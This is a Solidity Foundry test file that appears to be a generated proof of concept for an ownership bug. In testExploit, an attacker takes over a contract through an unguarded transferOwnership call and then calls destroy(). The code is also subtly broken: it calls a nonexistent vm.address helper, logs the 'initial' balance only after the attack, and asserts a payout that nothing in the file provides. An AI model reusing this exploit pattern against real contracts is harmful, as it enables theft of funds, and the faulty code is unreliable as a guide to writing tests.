// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/da51b355-8ab8-447c-9497-f80be5933694_OwnershipBug.sol";

contract TestOwnershipBug is BaseTestWithBalanceLog {
    address owner;
    OwnershipBug target;

    function setUp() public {
        vm.label(address(this), "TestContract");
        owner = vm.addr(1); // Assuming owner has address 1 for the purposes of testing
        target = new OwnershipBug(owner);
        target.transferOwnership(vm.address(9)); // Transfer ownership to a dummy address to block further actions
    }

    function testExploit() public balanceLog {
        // Setup attacker's address and prank
        address attacker = vm.addr(2);
        vm.startPrank(attacker);
        
        // Call the `transferOwnership` function to delegate control to the attacker
        target.transferOwnership(attacker);

        // Call the `destroy()` function from the owner (now the attacker)
        target.destroy();

        // Validation (Step 3)
        assertEq(address(target).balance, 0, "Funds were not destroyed");

        // End prank
        vm.stopPrank();
        
        // Add balance for validation (Step 4)
        balanceLog.push(attacker, "Initial Balance", attacker.balance);
        balanceLog.push(attacker, "After Exploit Balance", attacker.balance);

        // Assert that the attacker's balance has increased
        assertGt(attacker.balance, 1 ether, "Attacker did not receive any funds");
    }
}